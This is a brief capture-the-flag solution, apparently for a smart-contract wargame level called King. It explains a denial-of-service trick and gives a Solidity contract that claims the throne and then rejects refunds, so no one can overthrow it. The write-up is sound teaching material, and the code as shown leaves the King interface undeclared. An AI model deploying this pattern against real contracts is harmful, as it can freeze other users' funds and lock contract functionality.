# Task :

Whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process. Your goal is to break it and stay king forever 👑

# Solution :

All you have to do is make another contract that sends ether to the king contract but doesnt have a "recieve ether" function through which it can get the prize money from being overthrown. And if it didnt recieve the prize money the new king cant be declared.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract overThrowKing {
  constructor (address payable target) payable {
    uint prize = King(target).prize();
    (bool ok,) = target.call{value: prize}("");
    require(ok, "call failed" );
  }
}
```
